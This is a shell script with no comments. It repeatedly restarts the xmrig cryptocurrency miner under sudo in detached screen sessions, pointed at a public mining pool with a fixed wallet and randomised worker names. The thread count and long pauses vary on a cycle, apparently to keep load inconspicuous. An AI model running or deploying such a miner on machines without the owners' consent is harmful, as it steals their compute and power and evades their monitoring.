screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
